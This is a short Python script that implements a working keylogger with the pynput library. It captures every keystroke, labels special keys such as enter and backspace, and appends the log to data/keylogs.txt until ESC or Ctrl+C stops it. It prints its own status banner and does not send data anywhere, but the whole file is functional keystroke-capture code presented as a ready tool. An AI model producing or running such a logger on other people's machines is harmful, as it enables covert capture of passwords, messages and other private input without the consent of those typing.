from pynput import keyboard
import os
import time


running = True

def on_press(key):
    global running
    if key == keyboard.Key.esc:
        running = False
        return False 

    try:
        log_entry = str(key.char)
    except AttributeError:
      
        mapping = {
            keyboard.Key.space: " ",
            keyboard.Key.enter: "\n[ENTER]\n",
            keyboard.Key.backspace: " [BACKSPACE] "
        }
        log_entry = mapping.get(key, f" [{str(key)}] ")

   
    if not os.path.exists("data"):
        os.makedirs("data")

    with open("data/keylogs.txt", "a") as f:
        f.write(log_entry)
        f.flush()

def start():
    global running
    running = True
    print("\n\033[91m[!] KEYLOGGER STARTED (REAL-TIME)...\033[0m")
    print("[INFO] Recording to data/keylogs.txt | Press 'ESC' to stop.")

   
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    try:
       
        while running:
            time.sleep(0.1) 
    except KeyboardInterrupt:
      
        print("\n[!] Ctrl+C detected.")
    finally:
        listener.stop()
        print("\n\033[92m[✔] Keylogger stopped successfully.\033[0m")
